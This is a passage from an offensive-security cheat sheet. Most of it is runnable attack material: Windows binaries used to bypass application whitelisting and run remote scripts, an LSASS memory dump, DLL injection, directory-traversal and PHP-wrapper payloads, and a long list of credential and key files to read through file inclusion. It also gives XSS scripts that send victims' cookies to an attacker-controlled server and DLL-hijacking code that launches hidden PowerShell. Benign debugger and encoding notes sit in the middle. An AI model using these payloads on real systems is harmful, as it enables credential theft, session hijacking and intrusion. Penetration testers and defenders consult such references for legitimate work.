forfiles /p **&lt;path\_to\_look\_in&gt;** /m **&lt;file\_to\_look\_for&gt;** /c **&lt;command\_to\_run&gt;**
```

<span id="anchor-328"></span>Run Commands with Bash (If git is
installed)

```
bash.exe -c **&lt;command\_to\_run&gt;**
```

<span id="anchor-329"></span>Run Commands with ScriptRunner.exe (Part of
Application Virtualization Client)

```
scriptrunner.exe -appvscript **&lt;command\_to\_run&gt;**
```

<span id="anchor-330"></span>Run Commands with
SyncAppVPublishingServer.exe (Part of Application Virtualization Client)

```
SyncAppVPublishingServer.exe “n; **&lt;PowerShell\_Commants&gt;**
```

<span id="anchor-331"></span>Open an HTML or File Path with hh.exe

```
hh.exe **&lt;url\_or\_path&gt;**
```

<span id="anchor-332"></span>Run PowerShell Via JavaScript with
RunDLL32.exe

```
rundll32.exe javascript:"..\\mshtml,RunHTMLApplication "**&lt;PowerShell\_Commands&gt;**"
```

<span id="anchor-333"></span>Run Remote SCT Scripts with RegSvr32.exe

```
regsvr32.exe /s /n /u /i:**&lt;url\_to\_sct&gt;** scrobj.dll
```

<span id="anchor-334"></span>Run Commands with RegSvcs.exe & RegAsm.exe

Create a C\# project that utilizes the DLL Register & Unregister
Methods, similar to this example:
[*https://gist.github.com/xenoscr/2e5b1eec8ce1f7c1bbc2eed5a3bf3d07*](https://gist.github.com/xenoscr/2e5b1eec8ce1f7c1bbc2eed5a3bf3d07)

```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library /out:regsvcs.dll /keyfile:key.snk <strong>&lt;c#_project&gt;</strong>
To use the register module:
regsvcs.exe regsvcs.dll
OR
Regasm.exe regsvcs.dll
To use unregister module:
Regsvcs.exe /U regsvcs.dll
OR
Regasm.exe /U regsvcs.dll</p></td>
```

<span id="anchor-335"></span>Run Commands with BgInfo.exe

Create a custom \*.bgi file that will execute your custom VBS commands.
Similar to what is described here:

-   [*https://pentestlab.blog/2017/06/05/applocker-bypass-bginfo/*](https://pentestlab.blog/2017/06/05/applocker-bypass-bginfo/)
-   [*https://msitpros.com/?p=3831*](https://msitpros.com/?p=3831)

```
bginfo.exe **&lt;custom\_bgi\_file&gt;** /popup /nolicprompt
```

<span id="anchor-336"></span>Run Commands with Custom DLLs

Example located here:
[*https://gist.github.com/xenoscr/db37c65f7ffcc3b847c5aa81d7f42290*](https://gist.github.com/xenoscr/db37c65f7ffcc3b847c5aa81d7f42290)

```
InstallUtil.exe /logfile= /LogToConsole=false /U **&lt;custom\_dll&gt;**
```

<span id="anchor-337"></span>Run Remote .NET Code with IEEXEC.EXE

```
ieexec.exe **&lt;url\_to\_DotNet\_binary&gt;**
```

<span id="anchor-338"></span>Run Commands with msxsl.exe

Create XML files to execute JScript. A write up is located here:

```
msxsl.exe customers.xml script.xsl
```

<span id="anchor-339"></span>Run Commands with odbcconf.exe

Build a C\# project that will be built as a DLL then registered and run
with odbcconf.exe:
[*https://gist.github.com/xenoscr/b91638bc6c5c3318adac7488f257b7ce*](https://gist.github.com/xenoscr/b91638bc6c5c3318adac7488f257b7ce)

```
odbcconf.exe /f my.rsp
```

<span id="anchor-340"></span>Dump LSASS Process Memory with
sqldumper.exe

```
sqldumper.exe **&lt;lsass\_pid&gt;** 0 0x0110:40
```

<span id="anchor-341"></span>Run Commands with pcalua.exe

```
pcalua.exe -a **&lt;command&gt;**
```

<span id="anchor-342"></span>Running Commands with msiexec.exe

-   [*https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/*](https://pentestlab.blog/2017/06/16/applocker-bypass-msiexec/)

```
msiexec /quiet /i **&lt;msi\_with\_msi\_or\_png\_extention&gt;**
```

<span id="anchor-343"></span>Running Commands with cmstp.exe

-   [*https://msitpros.com/?p=3960*](https://msitpros.com/?p=3960)
-   [*https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e*](https://gist.github.com/api0cradle/cf36fd40fa991c3a6f7755d1810cc61e)

```
cmstp.exe /ni /s **&lt;malicious\_inf&gt;**
```

<span id="anchor-344"></span>DLL Loading with xwizard.exe

-   [*http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/*](http://www.hexacorn.com/blog/2017/07/31/the-wizard-of-x-oppa-plugx-style/)

```
Drop your malicious DLL into the same directory and xwizard.exe and run it.
```

<span id="anchor-345"></span>DLL Injection with MavInject32.exe

```
"C:\\Program Files\\Common Files\\microsoft shared\\ClickToRun\\MavInject32.exe" **&lt;PID&gt;** /INJECTRUNNING **&lt;PATH DLL&gt;**
```

<span id="anchor-346"></span>Running C\# with csi.exe (Interactive)

-   [*https://web.archive.org/web/20161008143428/http://subt0x10.blogspot.com/2016/09/application-whitelisting-bypass-csiexe.html*](https://web.archive.org/web/20161008143428/http://subt0x10.blogspot.com/2016/09/application-whitelisting-bypass-csiexe.html)

```
Run csi.exe and enter your C\# code.
```

<span id="anchor-347"></span>Running F\# with fsi.exe (Interactive)

-   [*https://gist.github.com/NickTyrer/51eb8c774a909634fa69b4d06fc79ae1*](https://gist.github.com/NickTyrer/51eb8c774a909634fa69b4d06fc79ae1)

```
Run fsi.exe and enter your F\# code.
```

<span id="anchor-348"></span>Creating a Control Panel to Execute Code
(DLL)

-   [*https://pentestlab.blog/2017/05/24/applocker-bypass-control-panel/*](https://pentestlab.blog/2017/05/24/applocker-bypass-control-panel/)

```
Create a dll and add a registry key to the HKCU hive to obtain code execution.
```

<span id="anchor-349"></span>Run Commands with dnx.exe

-   [*https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/*](https://enigma0x3.net/2016/11/17/bypassing-application-whitelisting-by-using-dnx-exe/)

```
Write C# file and accompanying JSON File, then execute:
dnx.exe <strong>&lt;appname&gt;</strong></p></td>
```

<span id="anchor-350"></span>Run Commands with cdb.exe

-   [*http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html*](http://www.exploit-monday.com/2016/08/windbg-cdb-shellcode-runner.html)
-   [*https://gist.github.com/mattifestation/94e2b0a9e3fe1ac0a433b5c3e6bd0bda*](https://gist.github.com/mattifestation/94e2b0a9e3fe1ac0a433b5c3e6bd0bda)

```
cdb.exe -cf **&lt;wds\_file&gt;** -o **&lt;command&gt;**
```

<span id="anchor-351"></span>Run Commands with MSBuild Using PowerShell

```
[Reflection.Assembly]::LoadWithPartialName('<a href="https://t.co/2nLz1YPu43">http://Microsoft.Build </a>');
<a href="https://twitter.com/search?q=%24e&amp;src=ctag">$e</a>=new-object<a href="https://t.co/2nLz1YPu43"> http://Microsoft.Build </a>.Evaluation.Project('<strong>&lt;csproj_file&gt;</strong>');
<a href="https://twitter.com/search?q=%24e&amp;src=ctag">$e</a>.Build();</td>
```

<span id="anchor-352"></span>Directory Traversals

```
../
..\
..\/
%2e%2e%2f
%252e%252e%252f
%255c..%255c
/%252e%252e/
%255c%255c..%255c
%c0%ae%c0%ae%c0%af
%uff0e%uff0e%u2215
%uff0e%uff0e%u2216
..././
...\.\
..%c0%af represents ../
..%c1%9c represents ..\
Prepend "/public/" to all aof the above.
Try absolute paths (with encoding?):
/file://absolute/path/&lt;traversal&gt;/etc/passwd</p></td>
```

<span id="anchor-353"></span>Reverse Engineering Commands

<span id="anchor-354"></span>Strings

<span id="anchor-355"></span>List Strings From File

```
strings **&lt;ELF File&gt;**
```

<span id="anchor-356"></span>Objcopy

<span id="anchor-357"></span>Copy/Rip Debugging Symbols From a Binary

```
objcopy --only-keep-debug rip\_from\_binary **&lt;ELF Binary w/Debugging Symbols&gt;**
```

<span id="anchor-358"></span>Add Debugging Symbols to a Binary

```
objcopy --add-gnu-debuglink=**&lt;symbol file&gt; &lt;ELF Binary&gt;**
```

<span id="anchor-359"></span>Strip

<span id="anchor-360"></span>Strip Debugging & Other Symbols

This can be useful if attempting to hide or make more difficult the
analysis of an executable. It can also reduce the size of a binary.

```
strip --strip-debug --strip-unneeded **&lt;ELF Binary&gt;**
```

<span id="anchor-361"></span>NM

<span id="anchor-362"></span>Display All Symbols

```
nm -a **&lt;ELF File&gt;**
```

<span id="anchor-363"></span>Display Sorted Symbols

```
nm -n **&lt;ELF File&gt;**
```

<span id="anchor-364"></span>Display External Symbols

```
nm -g **&lt;ELF File&gt;**
```

<span id="anchor-365"></span>Display Symbol Sizes

```
nm -S **&lt;ELF File&gt;**
```

<span id="anchor-366"></span>Command Symbol Types

|                 |                                         |
|-----------------|-----------------------------------------|
| **Symbol Type** | **Meaning**                             |
| A               | Absolute Symbol                         |
| B               | In the Uninitialized Data Section (BSS) |
| D               | In the Initialized Data Section         |
| N               | Debugging Symbol                        |
| T               | In the Text Section                     |
| U               | Symbol Undefined                        |

<span id="anchor-367"></span>Strace

<span id="anchor-368"></span>Show Timestamps in Output

```
strace -t **&lt;ELF File&gt;**
```

<span id="anchor-369"></span>Show Relative Timestamps in Output

```
strace -r **&lt;ELF File&gt;**
```

<span id="anchor-370"></span>Trace Specified System Calls

```
strace -e **&lt;comma separated list&gt; &lt;ELF File&gt;**
```

<span id="anchor-371"></span>Trace a Running Process (As root)

```
strace -p **&lt;PID&gt;**
```

<span id="anchor-372"></span>Trace Syscall Statistics

```
strace -c **&lt;ELF File&gt;**
```

<span id="anchor-373"></span>GNU Debugger Commands (gdb)

<span id="anchor-374"></span>Get ELF Details (Find the entry point)

```
shell readelf -h **&lt;filename&gt;**
```

<span id="anchor-375"></span>Run the Program

```
run **&lt;command&gt; &lt;args&gt;**
```

<span id="anchor-376"></span>List Functions

```
info functions
```

<span id="anchor-377"></span>List Variables

```
info variables
```

<span id="anchor-378"></span>List Variables in a Function

```
info scope **&lt;function name&gt;**
```

<span id="anchor-379"></span>Load Debugging Symbols from a File

```
symbol-file **&lt;symbol file&gt;**
```

<span id="anchor-380"></span>List Program Source (If available)

```
list **&lt;line number&gt;**
```

<span id="anchor-381"></span>Set Breakpoint

```
break **&lt;function name\|line number\|\*memory address&gt;**
```

<span id="anchor-382"></span>Show Breakpoints

```
info breakpoints
```

<span id="anchor-383"></span>Disable Breakpoint

```
disable **&lt;breakpoint number&gt;**
```

<span id="anchor-384"></span>Enable Breakpoint

```
enable **&lt;breakpoint number&gt;**
```

<span id="anchor-385"></span>Delete Breakpoint

```
delete **&lt;breakpoint number&gt;**
```

<span id="anchor-386"></span>Continue After Hitting Breakpoint

```
continue
```

<span id="anchor-387"></span>Step by Instruction

```
stepi **&lt;number&gt;**
```

<span id="anchor-388"></span>Step by Line

```
step **&lt;number&gt;**
```

<span id="anchor-389"></span>Inspect CPU Registers (while running)

```
inspect registers
```

<span id="anchor-390"></span>Examine Memory Address

```
x/**&lt;repeat count&gt;&lt;format&gt;&lt;size&gt; &lt;address&gt;**
```

<span id="anchor-391"></span>Print Variable Information

```
print **&lt;variable name&gt;**
```

<span id="anchor-392"></span>Disassemble Function

```
disassemble **&lt;function name&gt;**
```

<span id="anchor-393"></span>Change Memory Values of Running Program

```
set {**&lt;data type&gt;**} **&lt;memory address&gt;** = **&lt;new value&gt;**
```

<span id="anchor-394"></span>Addressing a Specific Byte In Memory
Address

```
(**&lt;memory address&gt;** + **&lt;integer&gt;**)
```

<span id="anchor-395"></span>Set Convenience Variable

```
set $**&lt;variable name&gt;** = **&lt;value&gt;**
```

<span id="anchor-396"></span>Call a Function (Any function within the
scope of the program)

```
call &lt;**function&gt;**(**&lt;arguments&gt;**)
```

<span id="anchor-397"></span>Change Disassembly Flavor to Intel

```
set disassembly-flavor intel
```

<span id="anchor-398"></span>Immunity Debugger

<span id="anchor-399"></span>Ignore Access Violations (Useful when
debugging shellcode with System calls)

```
   
```

<span id="anchor-400"></span>Encoding & Decoding

<span id="anchor-401"></span>Base64

<span id="anchor-402"></span>PowerShell

<span id="anchor-403"></span>Encode a String

```
$Text = ‘<strong>&lt;TEXT&gt;</strong>’
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)</p></td>
```

<span id="anchor-404"></span>Decode Base64 Encoded String

```
$EncodedText = “<strong>&lt;Base64_String&gt;</strong>”
$DecodedText = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($EncodedText))</p></td>
```

<span id="anchor-405"></span>Encode a Byte Array

```
$bytes = [Byte[]] ( <strong>&lt;Byte_Array&gt;</strong> )
$Encoded = [Convert]::ToBase64String($bytes)</p></td>
```

<span id="anchor-406"></span>Decode a Base64 Encoded Byte Array

```
$Encoded = “&lt;Base64_String&gt;”
$Bytes = [Convert]::FromBase64String($Encoded)</p></td>
```

<span id="anchor-407"></span>Python

<span id="anchor-408"></span>Encode a String

```
import Base64
Base64.b64Encode(<strong>'&lt;TEXT&gt;</strong>')</p></td>
```

<span id="anchor-409"></span>Decode Base64 Encoded String

```
import Base64
Base64.b64Decode('<strong>&lt;Base64_String&gt;</strong>')</p></td>
```

<span id="anchor-410"></span>JavaScript

<span id="anchor-411"></span>Encode a String

```
btoa('**&lt;TEXT&gt;**')
```

<span id="anchor-412"></span>Decode Base64 Encoded String

```
atob('**&lt;Base64\_String&gt;**')
```

<span id="anchor-413"></span>Escaped/Unescaped Unicode

<span id="anchor-414"></span>Javascript

<span id="anchor-415"></span>Encode a String

```
String.prototype.toUnicode = function(){ 
var result = "";
for(var i = 0; i &lt; this.length; i++){ 
<blockquote>
// Assumption: all characters are &lt; 0xffff 
</blockquote>
<blockquote>
result += "\\u" + ("000" + this[i].charCodeAt(0).toString(16)).substr(-4); 
</blockquote>
} 
return result; 
};
Examples:
"みどりいろ".toUnicode(); //"\u307f\u3069\u308a\u3044\u308d"
"Mi Do Ri I Ro".toUnicode(); //"\u004d\u0069\u0020\u0044\u006f\u0020\u0052\u0069\u0020\u0049\u0020\u0052\u006f" "Green".toUniCode(); //"\u0047\u0072\u0065\u0065\u006e"</p></td>
```

<span id="anchor-416"></span>Escaped/Unescaped Hex

<span id="anchor-417"></span>Binary File to Escaped Hex String (Linux)

```
od -tx1 **&lt;file\_name&gt;** \| sed -e 's/^\[0-9\]\* //' -e '$d' -e 's/^/ /' -e 's/ /\\\\x/g' \| tr -d '\\n'
```

<span id="anchor-418"></span>Escaped Hex to Binary File (PowerShell)

```
# Create an empty zero length Byte[] array
$decodedBytes = @()
 
# Escaped byte sequence to decode. This function should decode most sequences
$escapedByteString = "\x48\x65\x6C\x6C\x6F"
 
# Remove white spaces and other non-hex values
$byteString = $escapedByteString.ToLower() -Replace '[^a-f0-9\\,x\-\:]',''
 
# Remove the most common delimiters
$byteString = $byteString -Replace '0x|\\x| |\-|\:',''
 
# Step through the string two characters at a time and convert them to a byte array.
for ($i = 0; $i -lt $byteString.Length ; $i += 2)
{
$decodedBytes += [Byte]::Parse($byteString.Substring($i, 2), [System.Globalization.NumberStyles]::HexNumber)
}
# Write the decoded bytes to a binary file.
[io.file]::WriteAllBytes('output.bin',$decodedBytes)</p></td>
```

<span id="anchor-419"></span>Python Escape Bytes

```
s = '<strong>&lt;bytes&gt;</strong>'
sx = r"\x" + r"\x".join(s[n : n+2] for n in range(0, len(s), 2))</p></td>
```

<span id="anchor-420"></span>URL Encoding

<span id="anchor-421"></span>Python 2.x.x

```
import urllib
urlEncoded = urllib.quote_plus("<strong>&lt;string_to_encode&gt;</strong>")</p></td>
```

<span id="anchor-422"></span>Python 3.x.x

```
import urllib.parse
urlEncoded = urllib.parse.quote_plus("<strong>&lt;string_to_encode&gt;</strong>")</p></td>
```

<span id="anchor-423"></span>Local File Include (LFI)

<span id="anchor-424"></span>General Hints

Look for useful files such as:

-   Configuration files

    -   Passwords

    -   Valuable information

-   Database files

    -   Passwords

    -   Valuable information

-   Registry Backup Files (SAM & Security hives)

    -   Passwords

-   Log files

    -   SSH logs

    -   Apache logs

    -   It is possible to add PHP to a web request or other log and then
        > include the log file to gain execution.

        -   Reverse Shell via shell\_exec()
        -   Add a web-shell that executes supplied commands

-   Emails

    -   Send an email containing PHP and include it.

-   File uploads?

    -   Image metadata

-   Code Execution possibility

    -   /proc/self/environ&cmd=ls (Will execute "ls" command, The
        > command can be complex if this works. I.e. full Python reverse
        > shell, etc.)

<span id="anchor-425"></span>Null Terminators

```
%00
%2500</p></td>
```

<span id="anchor-426"></span>Interesting Files (Linux)

```
/etc/issue
/proc/version
/etc/profile
/etc/passwd
/etc/shadow
/root/.bash_history
/var/log/dmessage
/var/mail/root
/var/spool/cron/crontabs/root
/proc/self/environ
/var/log/mail/<strong>&lt;user&gt;</strong>
/var/log/apache2/access.log
/proc/self/environ
/tmp/sess_ID and /var/lib/php5/sess_ID
/var/log/auth.log
/etc/passwd
/etc/shadow
/etc/aliases
/etc/anacrontab
/etc/apache2/apache2.conf
/etc/apache2/httpd.conf
/etc/at.allow
/etc/at.deny
/etc/bashrc
/etc/bootptab
/etc/chrootUsers
/etc/chttp.conf
/etc/cron.allow
/etc/cron.deny
/etc/crontab
/etc/cups/cupsd.conf
/etc/exports
/etc/fstab
/etc/ftpaccess
/etc/ftpchroot
/etc/ftphosts
/etc/groups
/etc/grub.conf
/etc/hosts
/etc/hosts.allow
/etc/hosts.deny
/etc/httpd/access.conf
/etc/httpd/conf/httpd.conf
/etc/httpd/httpd.conf
/etc/httpd/logs/access_log
/etc/httpd/logs/access.log
/etc/httpd/logs/error_log
/etc/httpd/logs/error.log
/etc/httpd/php.ini
/etc/httpd/srm.conf
/etc/inetd.conf
/etc/inittab
/etc/issue
/etc/lighttpd.conf
/etc/lilo.conf
/etc/logrotate.d/ftp
/etc/logrotate.d/proftpd
/etc/logrotate.d/vsftpd.log
/etc/lsb-release
/etc/motd
/etc/modules.conf
/etc/motd
/etc/mtab
/etc/my.cnf
/etc/my.conf
/etc/mysql/my.cnf
/etc/network/interfaces
/etc/networks
/etc/npasswd
/etc/passwd
/etc/php4.4/fcgi/php.ini
/etc/php4/apache2/php.ini
/etc/php4/apache/php.ini
/etc/php4/cgi/php.ini
/etc/php4/apache2/php.ini
/etc/php5/apache2/php.ini
/etc/php5/apache/php.ini
/etc/php/apache2/php.ini
/etc/php/apache/php.ini
/etc/php/cgi/php.ini
/etc/php.ini
/etc/php/php4/php.ini
/etc/php/php.ini
/etc/printcap
/etc/profile
/etc/proftp.conf
/etc/proftpd/proftpd.conf
/etc/pure-ftpd.conf
/etc/pureftpd.passwd
/etc/pureftpd.pdb
/etc/pure-ftpd/pure-ftpd.conf
/etc/pure-ftpd/pure-ftpd.pdb
/etc/pure-ftpd/putreftpd.pdb
/etc/redhat-release
/etc/resolv.conf
/etc/samba/smb.conf
/etc/snmpd.conf
/etc/ssh/ssh_config
/etc/ssh/sshd_config
/etc/ssh/ssh_host_dsa_key
/etc/ssh/ssh_host_dsa_key.pub
/etc/ssh/ssh_host_key
/etc/ssh/ssh_host_key.pub
/etc/sysconfig/network
/etc/syslog.conf
/etc/termcap
/etc/vhcs2/proftpd/proftpd.conf
/etc/vsftpd.chroot_list
/etc/vsftpd.conf
/etc/vsftpd/vsftpd.conf
/etc/wu-ftpd/ftpaccess
/etc/wu-ftpd/ftphosts
/etc/wu-ftpd/ftpusers
/logs/pure-ftpd.log
/logs/security_debug_log
/logs/security_log
/opt/lampp/etc/httpd.conf
/opt/xampp/etc/php.ini
/proc/cpuinfo
/proc/filesystems
/proc/interrupts
/proc/ioports
/proc/meminfo
/proc/modules
/proc/mounts
/proc/stat
/proc/swaps
/proc/version
/proc/self/net/arp
/root/anaconda-ks.cfg
/usr/etc/pure-ftpd.conf
/usr/lib/php.ini
/usr/lib/php/php.ini
/usr/local/apache/conf/modsec.conf
/usr/local/apache/conf/php.ini
/usr/local/apache/log
/usr/local/apache/logs
/usr/local/apache/logs/access_log
/usr/local/apache/logs/access.log
/usr/local/apache/audit_log
/usr/local/apache/error_log
/usr/local/apache/error.log
/usr/local/cpanel/logs
/usr/local/cpanel/logs/access_log
/usr/local/cpanel/logs/error_log
/usr/local/cpanel/logs/license_log
/usr/local/cpanel/logs/login_log
/usr/local/cpanel/logs/stats_log
/usr/local/etc/httpd/logs/access_log
/usr/local/etc/httpd/logs/error_log
/usr/local/etc/php.ini
/usr/local/etc/pure-ftpd.conf
/usr/local/etc/pureftpd.pdb
/usr/local/lib/php.ini
/usr/local/php4/httpd.conf
/usr/local/php4/httpd.conf.php
/usr/local/php4/lib/php.ini
/usr/local/php5/httpd.conf
/usr/local/php5/httpd.conf.php
/usr/local/php5/lib/php.ini
/usr/local/php/httpd.conf
/usr/local/php/httpd.conf.ini
/usr/local/php/lib/php.ini
/usr/local/pureftpd/etc/pure-ftpd.conf
/usr/local/pureftpd/etc/pureftpd.pdn
/usr/local/pureftpd/sbin/pure-config.pl
/usr/local/www/logs/httpd_log
/usr/local/Zend/etc/php.ini
/usr/sbin/pure-config.pl
/var/adm/log/xferlog
/var/apache2/config.inc
/var/apache/logs/access_log
/var/apache/logs/error_log
/var/cpanel/cpanel.config
/var/lib/mysql/my.cnf
/var/lib/mysql/mysql/user.MYD
/var/local/www/conf/php.ini
/var/log/apache2/access_log
/var/log/apache2/access.log
/var/log/apache2/error_log
/var/log/apache2/error.log
/var/log/apache/access_log
/var/log/apache/access.log
/var/log/apache/error_log
/var/log/apache/error.log
/var/log/apache-ssl/access.log
/var/log/apache-ssl/error.log
/var/log/auth.log
/var/log/boot
/var/htmp
/var/log/chttp.log
/var/log/cups/error.log
/var/log/daemon.log
/var/log/debug
/var/log/dmesg
/var/log/dpkg.log
/var/log/exim_mainlog
/var/log/exim/mainlog
/var/log/exim_paniclog
/var/log/exim.paniclog
/var/log/exim_rejectlog
/var/log/exim/rejectlog
/var/log/faillog
/var/log/ftplog
/var/log/ftp-proxy
/var/log/ftp-proxy/ftp-proxy.log
/var/log/httpd/access_log
/var/log/httpd/access.log
/var/log/httpd/error_log
/var/log/httpd/error.log
/var/log/httpsd/ssl.access_log
/var/log/httpsd/ssl_log
/var/log/kern.log
/var/log/lastlog
/var/log/lighttpd/access.log
/var/log/lighttpd/error.log
/var/log/lighttpd/lighttpd.access.log
/var/log/lighttpd/lighttpd.error.log
/var/log/mail.info
/var/log/mail.log
/var/log/maillog
/var/log/mail.warn
/var/log/message
/var/log/messages
/var/log/mysqlderror.log
/var/log/mysql.log
/var/log/mysql/mysql-bin.log
/var/log/mysql/mysql.log
/var/log/mysql/mysql-slow.log
/var/log/proftpd
/var/log/pureftpd.log
/var/log/pure-ftpd/pure-ftpd.log
/var/log/secure
/var/log/vsftpd.log
/var/log/wtmp
/var/log/xferlog
/var/log/yum.log
/var/mysql.log
/var/run/utmp
/var/spool/cron/crontabs/root
/var/webmin/miniserv.log
/var/www/log/access_log
/var/www/log/error_log
/var/www/logs/access_log
/var/www/logs/error_log
/var/www/logs/access.log
/var/www/logs/error.log
~/.atfp_history
~/.bash_history
~/.bash_logout
~/.bash_profile
~/.bashrc
~/.gtkrc
~/.login
~/.logout
~/.mysql_history
~/.nano_history
~/.php_history
~/.profile
~/.ssh/authorized_keys
~/.ssh/id_dsa
~/.ssh/id_dsa.pub
~/.ssh/id_rsa
~/.ssh/id_rsa.pub
~/.ssh/identity
~/.ssh/identity.pub
~/.viminfo
~/.wm_style
~/.Xdefaults
~/.xinitrc
~/.Xresources
~/.xsession</p></td>
```

<span id="anchor-427"></span>Running Process Information (Linux)

```
/proc/&lt;int&gt;/fd/&lt;int&gt;
e.g.
/proc/2116/fd/11</p></td>
```

<span id="anchor-428"></span>Interesting Files (Windows)

```
%SYSTEMROOT%repairsystem
%SYSTEMROOT%repairSAM
%SYSTEMROOT%repairSAM
%WINDIR%win.ini
%SYSTEMDRIVE%boot.ini
%WINDIR%Panthersysprep.inf
%WINDIR%system32configAppEvent.Evt
C:/Users/Administrator/NTUser.dat
C:/Documents and Settings/Administrator/NTUser.dat
C:/apache/logs/access.log
C:/apache/logs/error.log
C:/apache/php/php.ini
C:/boot.ini
C:/inetpub/wwwroot/global.asa
C:/MySQL/data/hostname.err
C:/MySQL/data/mysql.err
C:/MySQL/data/mysql.log
C:/MySQL/my.cnf
C:/MySQL/my.ini
C:/php4/php.ini
C:/php5/php.ini
C:/php/php.ini
C:/Program Files/Apache Group/Apache2/conf/httpd.conf
C:/Program Files/Apache Group/Apache/conf/httpd.conf
C:/Program Files/Apache Group/Apache/logs/access.log
C:/Program Files/Apache Group/Apache/logs/error.log
C:/Program Files/FileZilla Server/FileZilla Server.xml
C:/Program Files/MySQL/data/hostname.err
C:/Program Files/MySQL/data/mysql-bin.log
C:/Program Files/MySQL/data/mysql.err
C:/Program Files/MySQL/data/mysql.log
C:/Program Files/MySQL/my.ini
C:/Program Files/MySQL/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/data/hostname.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql-bin.log
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.err
C:/Program Files/MySQL/MySQL Server 5.0/data/mysql.log
C:/Program Files/MySQL/MySQL Server 5.0/my.cnf
C:/Program Files/MySQL/MySQL Server 5.0/my.ini
C:/Program Files (x86)/Apache Group/Apache2/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/httpd.conf
C:/Program Files (x86)/Apache Group/Apache/conf/access.log
C:/Program Files (x86)/Apache Group/Apache/conf/error.log
C:/Program Files (x86)/FileZilla Server/FileZilla Server.xml
C:/Program Files (x86)/xampp/apache/conf/httpd.conf
C:/WINDOWS/php.ini
C:/WINDOWS/Repair/SAM
C:/Windows/repair/system
C:/Windows/repair/software
C:/Windows/repair/security
C:/WINDOWS/System32/drivers/etc/hosts
C:/Windows/win.ini
C:/WINNT/php.ini
C:/WINNT/win.ini
C:/xampp/apache/bin/php.ini
C:/xampp/apache/logs/access.log
C:/xampp/apache/logs/error.log
C:/Windows/Panther/Unattend/Unattended.xml
C:/Windows/Panther/Unattended.xml
C:/Windows/debug/NetSetup.log
C:/Windows/system32/config/AppEvent.Evt
C:/Windows/system32/config/SecEvent.Evt
C:/Windows/system32/config/default.sav
C:/Windows/system32/config/security.sav
C:/Windows/system32/config/software.sav
C:/Windows/system32/config/system.sav
C:/Windows/system32/config/regback/default
C:/Windows/system32/config/regback/sam
C:/Windows/system32/config/regback/security
C:/Windows/system32/config/regback/system
C:/Windows/system32/config/regback/software
C:/Program Files/MySQL/MySQL Server 5.1/my.ini
C:/Windows/System32/inetsrv/config/schema/ASPNET_schema.xml
C:/Windows/System32/inetsrv/config/applicationHost.config
C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log</p></td>
```

<span id="anchor-429"></span>Interesting Files (OSX)

```
/etc/fstab
/etc/master.passwd
/etc/resolv.conf
/etc/sudoers
/etc/sysctl.conf</p></td>
```

<span id="anchor-430"></span>Reading PHP/Binary File Contents

Including a file in the following format will return the contents in
Base64 encoding (May be useful for reading binary data)

```
php://filter/read=convert.base64-encode/resource=**&lt;file\_to\_read&gt;**
```

<span id="anchor-431"></span>PHP Wrappers

<span id="anchor-432"></span>PHP Expect Wrapper (Not default)

Could result in code execution.

```
php?page=expect://ls
```

<span id="anchor-433"></span>PHP Input Wrapper

```
?page=php://input&cmd=ls
```

<span id="anchor-434"></span>PHP Zip Wrapper

```
   
```

<span id="anchor-435"></span>XSS

<span id="anchor-436"></span>SVG Tag

```
&lt;svg/onload=location=window\[\`atob\`\]\`amF2YXNjcmlwdDphbGVydCgxKQ==\`;// https://t.co/pwtrIsYUTt
```

<span id="anchor-437"></span>Send Cookie & URL via JavaScript HTTP
Request (All Browsers)

```
function a(t){window.XMLHttpRequest?b=new XMLHttpRequest:b=new ActiveXObject("Microsoft.XMLHTTP"),b.onreadystatechange=function(){4==b.readyState&&200==b.status&&alert(b.responseText)},b.open("GET",t,!1),b.send()}a("http:/**/&lt;ip\_address&gt;**:**&lt;port&gt;**/somefile.php?cookie="+document.cookie+"&location="+document.location);
```

<span id="anchor-438"></span>Send Cookie in IMG Request via Added
Element

```
function addIMG() {
var img = document.createElement('img');
img.src = '<strong>&lt;server_URL&gt;</strong>' + document.cookie;
document.body.appendChild(img);
}
addIMG();</p></td>
```

<span id="anchor-439"></span>Using Stolen Cookies

From the inspection console.

```
document.cookie="**&lt;cookie&gt;**";
```

<span id="anchor-440"></span>COM Objects

<span id="anchor-441"></span>List All Available COM Objects

```
Get-ChildItem HKLM:\\Software\\Classes -ErrorAction SilentlyContinue \| Where-Object { $\_.PSChildName -match '^\\w+\\.\\w+$' -and (Test-Path -Path "$($\_.PSPath)\\CLSID") } \| Select-Object -ExpandProperty PSChildName
```

<span id="anchor-442"></span>Creating PowerShell COM Objects by CLSID

```
$type= [Type]::GetTypeFromCLSID('13709620-C279-11CE-A49E-444553540000')
$obj = [Activator]::CreateInstance($type)</td>
```

<span id="anchor-443"></span>Vulnerabilities/Exploits

<span id="anchor-444"></span>DLL Hijacking

<span id="anchor-445"></span>C++ Function Export Example

The following code will export a single function called
**VolumeDismount**.

```
#define EXPORT comment(linker, "/EXPORT:" __FUNCTION__ "=" __FUNCDNAME__)
using namespace std;
int VolumeDismount(string drive)
{
#pragma EXPORT
system("calc.exe");
return 0;
}</p></td>
```

<span id="anchor-446"></span>C++ EntryPoints & Exports

This example will run a command when the process attaches, it will also
pop **calc.exe** when one of the exported functions is called.

```
#include "stdafx.h"
#include &lt;stdlib.h&gt;
BOOL APIENTRY DllMain(HMODULE hModule,
DWORD ul_reason_for_call,
LPVOID lpReserved
)
{
switch (ul_reason_for_call)
{
case DLL_PROCESS_ATTACH:
system("start powershell -win hidden -nonI -nopro -ep bypass -File shell.ps1");
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DETACH:
break;
}
return TRUE;
}
extern "C" __declspec(dllexport) void SendARP()
{
WinExec("calc", SW_NORMAL);
}
extern "C" __declspec(dllexport) void GetIpNetTable()
{
